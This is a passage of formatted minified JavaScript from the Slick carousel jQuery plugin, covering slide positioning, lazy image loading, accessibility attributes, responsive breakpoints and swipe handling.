        !0 === n.options.centerMode && n.slideCount <= n.options.slidesToShow
          ? (n.slideOffset =
              (n.slideWidth * Math.floor(n.options.slidesToShow)) / 2 -
              (n.slideWidth * n.slideCount) / 2)
          : !0 === n.options.centerMode && !0 === n.options.infinite
          ? (n.slideOffset +=
              n.slideWidth * Math.floor(n.options.slidesToShow / 2) -
              n.slideWidth)
          : !0 === n.options.centerMode &&
            ((n.slideOffset = 0),
            (n.slideOffset +=
              n.slideWidth * Math.floor(n.options.slidesToShow / 2))),
        (e =
          !1 === n.options.vertical
            ? i * n.slideWidth * -1 + n.slideOffset
            : i * t * -1 + r),
        !0 === n.options.variableWidth &&
          ((o =
            n.slideCount <= n.options.slidesToShow || !1 === n.options.infinite
              ? n.$slideTrack.children(".slick-slide").eq(i)
              : n.$slideTrack
                  .children(".slick-slide")
                  .eq(i + n.options.slidesToShow)),
          (e =
            !0 === n.options.rtl
              ? o[0]
                ? -1 * (n.$slideTrack.width() - o[0].offsetLeft - o.width())
                : 0
              : o[0]
              ? -1 * o[0].offsetLeft
              : 0),
          !0 === n.options.centerMode &&
            ((o =
              n.slideCount <= n.options.slidesToShow ||
              !1 === n.options.infinite
                ? n.$slideTrack.children(".slick-slide").eq(i)
                : n.$slideTrack
                    .children(".slick-slide")
                    .eq(i + n.options.slidesToShow + 1)),
            (e =
              !0 === n.options.rtl
                ? o[0]
                  ? -1 * (n.$slideTrack.width() - o[0].offsetLeft - o.width())
                  : 0
                : o[0]
                ? -1 * o[0].offsetLeft
                : 0),
            (e += (n.$list.width() - o.outerWidth()) / 2))),
        e
      );
    }),
    (e.prototype.getOption = e.prototype.slickGetOption =
      function (i) {
        return this.options[i];
      }),
    (e.prototype.getNavigableIndexes = function () {
      var i,
        e = this,
        t = 0,
        o = 0,
        s = [];
      for (
        !1 === e.options.infinite
          ? (i = e.slideCount)
          : ((t = -1 * e.options.slidesToScroll),
            (o = -1 * e.options.slidesToScroll),
            (i = 2 * e.slideCount));
        t < i;

      )
        s.push(t),
          (t = o + e.options.slidesToScroll),
          (o +=
            e.options.slidesToScroll <= e.options.slidesToShow
              ? e.options.slidesToScroll
              : e.options.slidesToShow);
      return s;
    }),
    (e.prototype.getSlick = function () {
      return this;
    }),
    (e.prototype.getSlideCount = function () {
      var e,
        t,
        o = this;
      return (
        (t =
          !0 === o.options.centerMode
            ? o.slideWidth * Math.floor(o.options.slidesToShow / 2)
            : 0),
        !0 === o.options.swipeToSlide
          ? (o.$slideTrack.find(".slick-slide").each(function (s, n) {
              if (n.offsetLeft - t + i(n).outerWidth() / 2 > -1 * o.swipeLeft)
                return (e = n), !1;
            }),
            Math.abs(i(e).attr("data-slick-index") - o.currentSlide) || 1)
          : o.options.slidesToScroll
      );
    }),
    (e.prototype.goTo = e.prototype.slickGoTo =
      function (i, e) {
        this.changeSlide({ data: { message: "index", index: parseInt(i) } }, e);
      }),
    (e.prototype.init = function (e) {
      var t = this;
      i(t.$slider).hasClass("slick-initialized") ||
        (i(t.$slider).addClass("slick-initialized"),
        t.buildRows(),
        t.buildOut(),
        t.setProps(),
        t.startLoad(),
        t.loadSlider(),
        t.initializeEvents(),
        t.updateArrows(),
        t.updateDots(),
        t.checkResponsive(!0),
        t.focusHandler()),
        e && t.$slider.trigger("init", [t]),
        !0 === t.options.accessibility && t.initADA(),
        t.options.autoplay && ((t.paused = !1), t.autoPlay());
    }),
    (e.prototype.initADA = function () {
      var e = this,
        t = Math.ceil(e.slideCount / e.options.slidesToShow),
        o = e.getNavigableIndexes().filter(function (i) {
          return i >= 0 && i < e.slideCount;
        });
      e.$slides
        .add(e.$slideTrack.find(".slick-cloned"))
        .attr({ "aria-hidden": "true", tabindex: "-1" })
        .find("a, input, button, select")
        .attr({ tabindex: "-1" }),
        null !== e.$dots &&
          (e.$slides
            .not(e.$slideTrack.find(".slick-cloned"))
            .each(function (t) {
              var s = o.indexOf(t);
              i(this).attr({
                role: "tabpanel",
                id: "slick-slide" + e.instanceUid + t,
                tabindex: -1,
              }),
                -1 !== s &&
                  i(this).attr({
                    "aria-describedby":
                      "slick-slide-control" + e.instanceUid + s,
                  });
            }),
          e.$dots
            .attr("role", "tablist")
            .find("li")
            .each(function (s) {
              var n = o[s];
              i(this).attr({ role: "presentation" }),
                i(this)
                  .find("button")
                  .first()
                  .attr({
                    role: "tab",
                    id: "slick-slide-control" + e.instanceUid + s,
                    "aria-controls": "slick-slide" + e.instanceUid + n,
                    "aria-label": s + 1 + " of " + t,
                    "aria-selected": null,
                    tabindex: "-1",
                  });
            })
            .eq(e.currentSlide)
            .find("button")
            .attr({ "aria-selected": "true", tabindex: "0" })
            .end());
      for (var s = e.currentSlide, n = s + e.options.slidesToShow; s < n; s++)
        e.$slides.eq(s).attr("tabindex", 0);
      e.activateADA();
    }),
    (e.prototype.initArrowEvents = function () {
      var i = this;
      !0 === i.options.arrows &&
        i.slideCount > i.options.slidesToShow &&
        (i.$prevArrow
          .off("click.slick")
          .on("click.slick", { message: "previous" }, i.changeSlide),
        i.$nextArrow
          .off("click.slick")
          .on("click.slick", { message: "next" }, i.changeSlide),
        !0 === i.options.accessibility &&
          (i.$prevArrow.on("keydown.slick", i.keyHandler),
          i.$nextArrow.on("keydown.slick", i.keyHandler)));
    }),
    (e.prototype.initDotEvents = function () {
      var e = this;
      !0 === e.options.dots &&
        (i("li", e.$dots).on(
          "click.slick",
          { message: "index" },
          e.changeSlide
        ),
        !0 === e.options.accessibility &&
          e.$dots.on("keydown.slick", e.keyHandler)),
        !0 === e.options.dots &&
          !0 === e.options.pauseOnDotsHover &&
          i("li", e.$dots)
            .on("mouseenter.slick", i.proxy(e.interrupt, e, !0))
            .on("mouseleave.slick", i.proxy(e.interrupt, e, !1));
    }),
    (e.prototype.initSlideEvents = function () {
      var e = this;
      e.options.pauseOnHover &&
        (e.$list.on("mouseenter.slick", i.proxy(e.interrupt, e, !0)),
        e.$list.on("mouseleave.slick", i.proxy(e.interrupt, e, !1)));
    }),
    (e.prototype.initializeEvents = function () {
      var e = this;
      e.initArrowEvents(),
        e.initDotEvents(),
        e.initSlideEvents(),
        e.$list.on(
          "touchstart.slick mousedown.slick",
          { action: "start" },
          e.swipeHandler
        ),
        e.$list.on(
          "touchmove.slick mousemove.slick",
          { action: "move" },
          e.swipeHandler
        ),
        e.$list.on(
          "touchend.slick mouseup.slick",
          { action: "end" },
          e.swipeHandler
        ),
        e.$list.on(
          "touchcancel.slick mouseleave.slick",
          { action: "end" },
          e.swipeHandler
        ),
        e.$list.on("click.slick", e.clickHandler),
        i(document).on(e.visibilityChange, i.proxy(e.visibility, e)),
        !0 === e.options.accessibility &&
          e.$list.on("keydown.slick", e.keyHandler),
        !0 === e.options.focusOnSelect &&
          i(e.$slideTrack).children().on("click.slick", e.selectHandler),
        i(window).on(
          "orientationchange.slick.slick-" + e.instanceUid,
          i.proxy(e.orientationChange, e)
        ),
        i(window).on(
          "resize.slick.slick-" + e.instanceUid,
          i.proxy(e.resize, e)
        ),
        i("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault),
        i(window).on("load.slick.slick-" + e.instanceUid, e.setPosition),
        i(e.setPosition);
    }),
    (e.prototype.initUI = function () {
      var i = this;
      !0 === i.options.arrows &&
        i.slideCount > i.options.slidesToShow &&
        (i.$prevArrow.show(), i.$nextArrow.show()),
        !0 === i.options.dots &&
          i.slideCount > i.options.slidesToShow &&
          i.$dots.show();
    }),
    (e.prototype.keyHandler = function (i) {
      var e = this;
      i.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
        (37 === i.keyCode && !0 === e.options.accessibility
          ? e.changeSlide({
              data: { message: !0 === e.options.rtl ? "next" : "previous" },
            })
          : 39 === i.keyCode &&
            !0 === e.options.accessibility &&
            e.changeSlide({
              data: { message: !0 === e.options.rtl ? "previous" : "next" },
            }));
    }),
    (e.prototype.lazyLoad = function () {
      function e(e) {
        i("img[data-lazy]", e).each(function () {
          var e = i(this),
            t = i(this).attr("data-lazy"),
            o = i(this).attr("data-srcset"),
            s = i(this).attr("data-sizes") || n.$slider.attr("data-sizes"),
            r = document.createElement("img");
          (r.onload = function () {
            e.animate({ opacity: 0 }, 100, function () {
              o && (e.attr("srcset", o), s && e.attr("sizes", s)),
                e.attr("src", t).animate({ opacity: 1 }, 200, function () {
                  e.removeAttr("data-lazy data-srcset data-sizes").removeClass(
                    "slick-loading"
                  );
                }),
                n.$slider.trigger("lazyLoaded", [n, e, t]);
            });
          }),
            (r.onerror = function () {
              e
                .removeAttr("data-lazy")
                .removeClass("slick-loading")
                .addClass("slick-lazyload-error"),
                n.$slider.trigger("lazyLoadError", [n, e, t]);
            }),
            (r.src = t);
        });
      }
      var t,
        o,
        s,
        n = this;
      if (
        (!0 === n.options.centerMode
          ? !0 === n.options.infinite
            ? (s =
                (o = n.currentSlide + (n.options.slidesToShow / 2 + 1)) +
                n.options.slidesToShow +
                2)
            : ((o = Math.max(
                0,
                n.currentSlide - (n.options.slidesToShow / 2 + 1)
              )),
              (s = n.options.slidesToShow / 2 + 1 + 2 + n.currentSlide))
          : ((o = n.options.infinite
              ? n.options.slidesToShow + n.currentSlide
              : n.currentSlide),
            (s = Math.ceil(o + n.options.slidesToShow)),
            !0 === n.options.fade && (o > 0 && o--, s <= n.slideCount && s++)),
        (t = n.$slider.find(".slick-slide").slice(o, s)),
        "anticipated" === n.options.lazyLoad)
      )
        for (
          var r = o - 1, l = s, d = n.$slider.find(".slick-slide"), a = 0;
          a < n.options.slidesToScroll;
          a++
        )
          r < 0 && (r = n.slideCount - 1),
            (t = (t = t.add(d.eq(r))).add(d.eq(l))),
            r--,
            l++;
      e(t),
        n.slideCount <= n.options.slidesToShow
          ? e(n.$slider.find(".slick-slide"))
          : n.currentSlide >= n.slideCount - n.options.slidesToShow
          ? e(n.$slider.find(".slick-cloned").slice(0, n.options.slidesToShow))
          : 0 === n.currentSlide &&
            e(
              n.$slider.find(".slick-cloned").slice(-1 * n.options.slidesToShow)
            );
    }),
    (e.prototype.loadSlider = function () {
      var i = this;
      i.setPosition(),
        i.$slideTrack.css({ opacity: 1 }),
        i.$slider.removeClass("slick-loading"),
        i.initUI(),
        "progressive" === i.options.lazyLoad && i.progressiveLazyLoad();
    }),
    (e.prototype.next = e.prototype.slickNext =
      function () {
        this.changeSlide({ data: { message: "next" } });
      }),
    (e.prototype.orientationChange = function () {
      var i = this;
      i.checkResponsive(), i.setPosition();
    }),
    (e.prototype.pause = e.prototype.slickPause =
      function () {
        var i = this;
        i.autoPlayClear(), (i.paused = !0);
      }),
    (e.prototype.play = e.prototype.slickPlay =
      function () {
        var i = this;
        i.autoPlay(),
          (i.options.autoplay = !0),
          (i.paused = !1),
          (i.focussed = !1),
          (i.interrupted = !1);
      }),
    (e.prototype.postSlide = function (e) {
      var t = this;
      t.unslicked ||
        (t.$slider.trigger("afterChange", [t, e]),
        (t.animating = !1),
        t.slideCount > t.options.slidesToShow && t.setPosition(),
        (t.swipeLeft = null),
        t.options.autoplay && t.autoPlay(),
        !0 === t.options.accessibility &&
          (t.initADA(),
          t.options.focusOnChange &&
            i(t.$slides.get(t.currentSlide)).attr("tabindex", 0).focus()));
    }),
    (e.prototype.prev = e.prototype.slickPrev =
      function () {
        this.changeSlide({ data: { message: "previous" } });
      }),
    (e.prototype.preventDefault = function (i) {
      i.preventDefault();
    }),
    (e.prototype.progressiveLazyLoad = function (e) {
      e = e || 1;
      var t,
        o,
        s,
        n,
        r,
        l = this,
        d = i("img[data-lazy]", l.$slider);
      d.length
        ? ((t = d.first()),
          (o = t.attr("data-lazy")),
          (s = t.attr("data-srcset")),
          (n = t.attr("data-sizes") || l.$slider.attr("data-sizes")),
          ((r = document.createElement("img")).onload = function () {
            s && (t.attr("srcset", s), n && t.attr("sizes", n)),
              t
                .attr("src", o)
                .removeAttr("data-lazy data-srcset data-sizes")
                .removeClass("slick-loading"),
              !0 === l.options.adaptiveHeight && l.setPosition(),
              l.$slider.trigger("lazyLoaded", [l, t, o]),
              l.progressiveLazyLoad();
          }),
          (r.onerror = function () {
            e < 3
              ? setTimeout(function () {
                  l.progressiveLazyLoad(e + 1);
                }, 500)
              : (t
                  .removeAttr("data-lazy")
                  .removeClass("slick-loading")
                  .addClass("slick-lazyload-error"),
                l.$slider.trigger("lazyLoadError", [l, t, o]),
                l.progressiveLazyLoad());
          }),
          (r.src = o))
        : l.$slider.trigger("allImagesLoaded", [l]);
    }),
    (e.prototype.refresh = function (e) {
      var t,
        o,
        s = this;
      (o = s.slideCount - s.options.slidesToShow),
        !s.options.infinite && s.currentSlide > o && (s.currentSlide = o),
        s.slideCount <= s.options.slidesToShow && (s.currentSlide = 0),
        (t = s.currentSlide),
        s.destroy(!0),
        i.extend(s, s.initials, { currentSlide: t }),
        s.init(),
        e || s.changeSlide({ data: { message: "index", index: t } }, !1);
    }),
    (e.prototype.registerBreakpoints = function () {
      var e,
        t,
        o,
        s = this,
        n = s.options.responsive || null;
      if ("array" === i.type(n) && n.length) {
        s.respondTo = s.options.respondTo || "window";
        for (e in n)
          if (((o = s.breakpoints.length - 1), n.hasOwnProperty(e))) {
            for (t = n[e].breakpoint; o >= 0; )
              s.breakpoints[o] &&
                s.breakpoints[o] === t &&
                s.breakpoints.splice(o, 1),
                o--;
            s.breakpoints.push(t), (s.breakpointSettings[t] = n[e].settings);
          }
        s.breakpoints.sort(function (i, e) {
          return s.options.mobileFirst ? i - e : e - i;
        });
      }
    }),
    (e.prototype.reinit = function () {
      var e = this;
      (e.$slides = e.$slideTrack
        .children(e.options.slide)
        .addClass("slick-slide")),
        (e.slideCount = e.$slides.length),
        e.currentSlide >= e.slideCount &&
          0 !== e.currentSlide &&
          (e.currentSlide = e.currentSlide - e.options.slidesToScroll),
        e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0),
        e.registerBreakpoints(),
        e.setProps(),
        e.setupInfinite(),
        e.buildArrows(),
        e.updateArrows(),
        e.initArrowEvents(),
        e.buildDots(),
        e.updateDots(),
        e.initDotEvents(),
        e.cleanUpSlideEvents(),
        e.initSlideEvents(),
        e.checkResponsive(!1, !0),
        !0 === e.options.focusOnSelect &&
          i(e.$slideTrack).children().on("click.slick", e.selectHandler),
        e.setSlideClasses(
          "number" == typeof e.currentSlide ? e.currentSlide : 0
        ),
        e.setPosition(),
        e.focusHandler(),
        (e.paused = !e.options.autoplay),
        e.autoPlay(),
        e.$slider.trigger("reInit", [e]);
    }),
    (e.prototype.resize = function () {
      var e = this;
      i(window).width() !== e.windowWidth &&
        (clearTimeout(e.windowDelay),
        (e.windowDelay = window.setTimeout(function () {
          (e.windowWidth = i(window).width()),
            e.checkResponsive(),
            e.unslicked || e.setPosition();
        }, 50)));
    }),
    (e.prototype.removeSlide = e.prototype.slickRemove =
      function (i, e, t) {
        var o = this;
        if (
          ((i =
            "boolean" == typeof i
              ? !0 === (e = i)
                ? 0
                : o.slideCount - 1
              : !0 === e
              ? --i
              : i),
          o.slideCount < 1 || i < 0 || i > o.slideCount - 1)
        )
          return !1;
        o.unload(),
          !0 === t
            ? o.$slideTrack.children().remove()
            : o.$slideTrack.children(this.options.slide).eq(i).remove(),
          (o.$slides = o.$slideTrack.children(this.options.slide)),
          o.$slideTrack.children(this.options.slide).detach(),
          o.$slideTrack.append(o.$slides),
          (o.$slidesCache = o.$slides),
          o.reinit();
      }),
    (e.prototype.setCSS = function (i) {
      var e,
        t,
        o = this,
        s = {};
      !0 === o.options.rtl && (i = -i),
        (e = "left" == o.positionProp ? Math.ceil(i) + "px" : "0px"),
        (t = "top" == o.positionProp ? Math.ceil(i) + "px" : "0px"),
        (s[o.positionProp] = i),
        !1 === o.transformsEnabled
          ? o.$slideTrack.css(s)
          : ((s = {}),
            !1 === o.cssTransitions
              ? ((s[o.animType] = "translate(" + e + ", " + t + ")"),
                o.$slideTrack.css(s))
              : ((s[o.animType] = "translate3d(" + e + ", " + t + ", 0px)"),
                o.$slideTrack.css(s)));
    }),
    (e.prototype.setDimensions = function () {
      var i = this;
      !1 === i.options.vertical
        ? !0 === i.options.centerMode &&
          i.$list.css({ padding: "0px " + i.options.centerPadding })
        : (i.$list.height(
            i.$slides.first().outerHeight(!0) * i.options.slidesToShow
          ),
          !0 === i.options.centerMode &&
            i.$list.css({ padding: i.options.centerPadding + " 0px" })),
        (i.listWidth = i.$list.width()),
        (i.listHeight = i.$list.height()),
        !1 === i.options.vertical && !1 === i.options.variableWidth
          ? ((i.slideWidth = Math.ceil(i.listWidth / i.options.slidesToShow)),
            i.$slideTrack.width(
              Math.ceil(
                i.slideWidth * i.$slideTrack.children(".slick-slide").length
              )
            ))
          : !0 === i.options.variableWidth
          ? i.$slideTrack.width(5e3 * i.slideCount)
          : ((i.slideWidth = Math.ceil(i.listWidth)),
            i.$slideTrack.height(
              Math.ceil(
                i.$slides.first().outerHeight(!0) *
                  i.$slideTrack.children(".slick-slide").length
              )
            ));
      var e = i.$slides.first().outerWidth(!0) - i.$slides.first().width();
      !1 === i.options.variableWidth &&
        i.$slideTrack.children(".slick-slide").width(i.slideWidth - e);
    }),
    (e.prototype.setFade = function () {
      var e,
        t = this;
      t.$slides.each(function (o, s) {
        (e = t.slideWidth * o * -1),
          !0 === t.options.rtl
            ? i(s).css({
                position: "relative",
                right: e,
                top: 0,
                zIndex: t.options.zIndex - 2,
                opacity: 0,
              })
            : i(s).css({
                position: "relative",
                left: e,
                top: 0,
                zIndex: t.options.zIndex - 2,
                opacity: 0,
              });
      }),
        t.$slides
          .eq(t.currentSlide)
          .css({ zIndex: t.options.zIndex - 1, opacity: 1 });
    }),
    (e.prototype.setHeight = function () {
      var i = this;
      if (
        1 === i.options.slidesToShow &&
        !0 === i.options.adaptiveHeight &&
        !1 === i.options.vertical
      ) {
        var e = i.$slides.eq(i.currentSlide).outerHeight(!0);
        i.$list.css("height", e);
      }
    }),
    (e.prototype.setOption = e.prototype.slickSetOption =
      function () {
        var e,
          t,
          o,
          s,
          n,
          r = this,
          l = !1;
        if (
          ("object" === i.type(arguments[0])
            ? ((o = arguments[0]), (l = arguments[1]), (n = "multiple"))
            : "string" === i.type(arguments[0]) &&
              ((o = arguments[0]),
              (s = arguments[1]),
              (l = arguments[2]),
              "responsive" === arguments[0] && "array" === i.type(arguments[1])
                ? (n = "responsive")
                : void 0 !== arguments[1] && (n = "single")),
          "single" === n)
        )
          r.options[o] = s;
        else if ("multiple" === n)
          i.each(o, function (i, e) {
            r.options[i] = e;
          });
        else if ("responsive" === n)
          for (t in s)
            if ("array" !== i.type(r.options.responsive))
              r.options.responsive = [s[t]];
            else {
              for (e = r.options.responsive.length - 1; e >= 0; )
                r.options.responsive[e].breakpoint === s[t].breakpoint &&
                  r.options.responsive.splice(e, 1),
                  e--;
              r.options.responsive.push(s[t]);
            }
        l && (r.unload(), r.reinit());
      }),
    (e.prototype.setPosition = function () {
      var i = this;
      i.setDimensions(),
        i.setHeight(),
        !1 === i.options.fade
          ? i.setCSS(i.getLeft(i.currentSlide))
          : i.setFade(),
        i.$slider.trigger("setPosition", [i]);
    }),
    (e.prototype.setProps = function () {
      var i = this,
        e = document.body.style;
      (i.positionProp = !0 === i.options.vertical ? "top" : "left"),
        "top" === i.positionProp
          ? i.$slider.addClass("slick-vertical")
          : i.$slider.removeClass("slick-vertical"),
        (void 0 === e.WebkitTransition &&
          void 0 === e.MozTransition &&
          void 0 === e.msTransition) ||
          (!0 === i.options.useCSS && (i.cssTransitions = !0)),
        i.options.fade &&
          ("number" == typeof i.options.zIndex
            ? i.options.zIndex < 3 && (i.options.zIndex = 3)
            : (i.options.zIndex = i.defaults.zIndex)),
        void 0 !== e.OTransform &&
          ((i.animType = "OTransform"),
          (i.transformType = "-o-transform"),
          (i.transitionType = "OTransition"),
          void 0 === e.perspectiveProperty &&
            void 0 === e.webkitPerspective &&
            (i.animType = !1)),
        void 0 !== e.MozTransform &&
          ((i.animType = "MozTransform"),
          (i.transformType = "-moz-transform"),
          (i.transitionType = "MozTransition"),
          void 0 === e.perspectiveProperty &&
            void 0 === e.MozPerspective &&
            (i.animType = !1)),
        void 0 !== e.webkitTransform &&
          ((i.animType = "webkitTransform"),
          (i.transformType = "-webkit-transform"),
          (i.transitionType = "webkitTransition"),
          void 0 === e.perspectiveProperty &&
            void 0 === e.webkitPerspective &&
            (i.animType = !1)),
        void 0 !== e.msTransform &&
          ((i.animType = "msTransform"),
          (i.transformType = "-ms-transform"),
          (i.transitionType = "msTransition"),
          void 0 === e.msTransform && (i.animType = !1)),
        void 0 !== e.transform &&
          !1 !== i.animType &&
          ((i.animType = "transform"),
          (i.transformType = "transform"),
          (i.transitionType = "transition")),
        (i.transformsEnabled =
          i.options.useTransform && null !== i.animType && !1 !== i.animType);
    }),
    (e.prototype.setSlideClasses = function (i) {
      var e,
        t,
        o,
        s,
        n = this;
      if (
        ((t = n.$slider
          .find(".slick-slide")
          .removeClass("slick-active slick-center slick-current")
          .attr("aria-hidden", "true")),
        n.$slides.eq(i).addClass("slick-current"),
        !0 === n.options.centerMode)
      ) {
        var r = n.options.slidesToShow % 2 == 0 ? 1 : 0;
        (e = Math.floor(n.options.slidesToShow / 2)),
          !0 === n.options.infinite &&
            (i >= e && i <= n.slideCount - 1 - e
              ? n.$slides
                  .slice(i - e + r, i + e + 1)
                  .addClass("slick-active")
                  .attr("aria-hidden", "false")
              : ((o = n.options.slidesToShow + i),
                t
                  .slice(o - e + 1 + r, o + e + 2)
                  .addClass("slick-active")
                  .attr("aria-hidden", "false")),
            0 === i
              ? t
                  .eq(t.length - 1 - n.options.slidesToShow)
                  .addClass("slick-center")
              : i === n.slideCount - 1 &&
                t.eq(n.options.slidesToShow).addClass("slick-center")),
          n.$slides.eq(i).addClass("slick-center");
      } else
        i >= 0 && i <= n.slideCount - n.options.slidesToShow
          ? n.$slides
              .slice(i, i + n.options.slidesToShow)
              .addClass("slick-active")
              .attr("aria-hidden", "false")
          : t.length <= n.options.slidesToShow
          ? t.addClass("slick-active").attr("aria-hidden", "false")
          : ((s = n.slideCount % n.options.slidesToShow),
            (o = !0 === n.options.infinite ? n.options.slidesToShow + i : i),
            n.options.slidesToShow == n.options.slidesToScroll &&
            n.slideCount - i < n.options.slidesToShow
              ? t
                  .slice(o - (n.options.slidesToShow - s), o + s)
                  .addClass("slick-active")
                  .attr("aria-hidden", "false")
              : t
                  .slice(o, o + n.options.slidesToShow)
                  .addClass("slick-active")
                  .attr("aria-hidden", "false"));
      ("ondemand" !== n.options.lazyLoad &&
        "anticipated" !== n.options.lazyLoad) ||
        n.lazyLoad();
    }),
    (e.prototype.setupInfinite = function () {
      var e,
        t,
        o,
        s = this;
      if (
        (!0 === s.options.fade && (s.options.centerMode = !1),
        !0 === s.options.infinite &&
          !1 === s.options.fade &&
          ((t = null), s.slideCount > s.options.slidesToShow))
      ) {
        for (
          o =
            !0 === s.options.centerMode
              ? s.options.slidesToShow + 1
              : s.options.slidesToShow,
            e = s.slideCount;
          e > s.slideCount - o;
          e -= 1
        )
          (t = e - 1),
            i(s.$slides[t])
              .clone(!0)
              .attr("id", "")
              .attr("data-slick-index", t - s.slideCount)
              .prependTo(s.$slideTrack)
              .addClass("slick-cloned");
        for (e = 0; e < o + s.slideCount; e += 1)
          (t = e),
            i(s.$slides[t])
              .clone(!0)
              .attr("id", "")
              .attr("data-slick-index", t + s.slideCount)
              .appendTo(s.$slideTrack)
              .addClass("slick-cloned");
        s.$slideTrack
          .find(".slick-cloned")
          .find("[id]")
          .each(function () {
            i(this).attr("id", "");
          });
      }
    }),
    (e.prototype.interrupt = function (i) {
      var e = this;
      i || e.autoPlay(), (e.interrupted = i);
    }),
    (e.prototype.selectHandler = function (e) {
      var t = this,
        o = i(e.target).is(".slick-slide")
          ? i(e.target)
          : i(e.target).parents(".slick-slide"),
        s = parseInt(o.attr("data-slick-index"));
      s || (s = 0),
        t.slideCount <= t.options.slidesToShow
          ? t.slideHandler(s, !1, !0)
          : t.slideHandler(s);
    }),
    (e.prototype.slideHandler = function (i, e, t) {
      var o,
        s,
        n,
        r,
        l,
        d = null,
        a = this;
      if (
        ((e = e || !1),
        !(
          (!0 === a.animating && !0 === a.options.waitForAnimate) ||
          (!0 === a.options.fade && a.currentSlide === i)
        ))
      )
        if (
          (!1 === e && a.asNavFor(i),
          (o = i),
          (d = a.getLeft(o)),
          (r = a.getLeft(a.currentSlide)),
          (a.currentLeft = null === a.swipeLeft ? r : a.swipeLeft),
          !1 === a.options.infinite &&
            !1 === a.options.centerMode &&
            (i < 0 || i > a.getDotCount() * a.options.slidesToScroll))
        )
          !1 === a.options.fade &&
            ((o = a.currentSlide),
            !0 !== t
              ? a.animateSlide(r, function () {
                  a.postSlide(o);
                })
              : a.postSlide(o));
        else if (
          !1 === a.options.infinite &&
          !0 === a.options.centerMode &&
          (i < 0 || i > a.slideCount - a.options.slidesToScroll)
        )
          !1 === a.options.fade &&
            ((o = a.currentSlide),
            !0 !== t
              ? a.animateSlide(r, function () {
                  a.postSlide(o);
                })
              : a.postSlide(o));
        else {
          if (
            (a.options.autoplay && clearInterval(a.autoPlayTimer),
            (s =
              o < 0
                ? a.slideCount % a.options.slidesToScroll != 0
                  ? a.slideCount - (a.slideCount % a.options.slidesToScroll)
                  : a.slideCount + o
                : o >= a.slideCount
                ? a.slideCount % a.options.slidesToScroll != 0
                  ? 0
                  : o - a.slideCount
                : o),
            (a.animating = !0),
            a.$slider.trigger("beforeChange", [a, a.currentSlide, s]),
            (n = a.currentSlide),
            (a.currentSlide = s),
            a.setSlideClasses(a.currentSlide),
            a.options.asNavFor &&
              (l = (l = a.getNavTarget()).slick("getSlick")).slideCount <=
                l.options.slidesToShow &&
              l.setSlideClasses(a.currentSlide),
            a.updateDots(),
            a.updateArrows(),
            !0 === a.options.fade)
          )
            return (
              !0 !== t
                ? (a.fadeSlideOut(n),
                  a.fadeSlide(s, function () {
                    a.postSlide(s);
                  }))
                : a.postSlide(s),
              void a.animateHeight()
            );
          !0 !== t
            ? a.animateSlide(d, function () {
                a.postSlide(s);
              })
            : a.postSlide(s);
        }
    }),
    (e.prototype.startLoad = function () {
      var i = this;
      !0 === i.options.arrows &&
        i.slideCount > i.options.slidesToShow &&
        (i.$prevArrow.hide(), i.$nextArrow.hide()),
        !0 === i.options.dots &&
          i.slideCount > i.options.slidesToShow &&
          i.$dots.hide(),
        i.$slider.addClass("slick-loading");
    }),
    (e.prototype.swipeDirection = function () {
      var i,
        e,
        t,
        o,
        s = this;
      return (
        (i = s.touchObject.startX - s.touchObject.curX),
        (e = s.touchObject.startY - s.touchObject.curY),
        (t = Math.atan2(e, i)),
        (o = Math.round((180 * t) / Math.PI)) < 0 && (o = 360 - Math.abs(o)),
        o <= 45 && o >= 0
          ? !1 === s.options.rtl
            ? "left"
            : "right"
          : o <= 360 && o >= 315
          ? !1 === s.options.rtl
            ? "left"
            : "right"
          : o >= 135 && o <= 225
          ? !1 === s.options.rtl
            ? "right"
            : "left"
          : !0 === s.options.verticalSwiping
          ? o >= 35 && o <= 135
            ? "down"
            : "up"
          : "vertical"
      );
    }),
    (e.prototype.swipeEnd = function (i) {
      var e,
        t,
        o = this;
      if (((o.dragging = !1), (o.swiping = !1), o.scrolling))
        return (o.scrolling = !1), !1;
      if (
        ((o.interrupted = !1),
        (o.shouldClick = !(o.touchObject.swipeLength > 10)),
        void 0 === o.touchObject.curX)
      )
        return !1;
      if (
        (!0 === o.touchObject.edgeHit &&
          o.$slider.trigger("edge", [o, o.swipeDirection()]),
        o.touchObject.swipeLength >= o.touchObject.minSwipe)
      ) {
        switch ((t = o.swipeDirection())) {
          case "left":
          case "down":
            (e = o.options.swipeToSlide
              ? o.checkNavigable(o.currentSlide + o.getSlideCount())
              : o.currentSlide + o.getSlideCount()),
              (o.currentDirection = 0);
            break;
          case "right":
          case "up":
            (e = o.options.swipeToSlide
              ? o.checkNavigable(o.currentSlide - o.getSlideCount())
              : o.currentSlide - o.getSlideCount()),
              (o.currentDirection = 1);
        }
        "vertical" != t &&
          (o.slideHandler(e),
          (o.touchObject = {}),
          o.$slider.trigger("swipe", [o, t]));
      } else
        o.touchObject.startX !== o.touchObject.curX &&
          (o.slideHandler(o.currentSlide), (o.touchObject = {}));
    }),
    (e.prototype.swipeHandler = function (i) {
      var e = this;
      if (
        !(
          !1 === e.options.swipe ||
          ("ontouchend" in document && !1 === e.options.swipe) ||
          (!1 === e.options.draggable && -1 !== i.type.indexOf("mouse"))
        )
      )
        switch (
          ((e.touchObject.fingerCount =
            i.originalEvent && void 0 !== i.originalEvent.touches
              ? i.originalEvent.touches.length
              : 1),
          (e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold),
          !0 === e.options.verticalSwiping &&
            (e.touchObject.minSwipe = e.listHeight / e.options.touchThreshold),
          i.data.action)
        ) {
          case "start":
            e.swipeStart(i);
            break;
          case "move":
            e.swipeMove(i);
            break;
          case "end":
            e.swipeEnd(i);
        }
    }),
    (e.prototype.swipeMove = function (i) {
      var e,
        t,
        o,
        s,
        n,
        r,
        l = this;
      return (
        (n = void 0 !== i.originalEvent ? i.originalEvent.touches : null),
        !(!l.dragging || l.scrolling || (n && 1 !== n.length)) &&
          ((e = l.getLeft(l.currentSlide)),
          (l.touchObject.curX = void 0 !== n ? n[0].pageX : i.clientX),
          (l.touchObject.curY = void 0 !== n ? n[0].pageY : i.clientY),
          (l.touchObject.swipeLength = Math.round(
            Math.sqrt(Math.pow(l.touchObject.curX - l.touchObject.startX, 2))
          )),
          (r = Math.round(
            Math.sqrt(Math.pow(l.touchObject.curY - l.touchObject.startY, 2))
          )),
          !l.options.verticalSwiping && !l.swiping && r > 4
            ? ((l.scrolling = !0), !1)
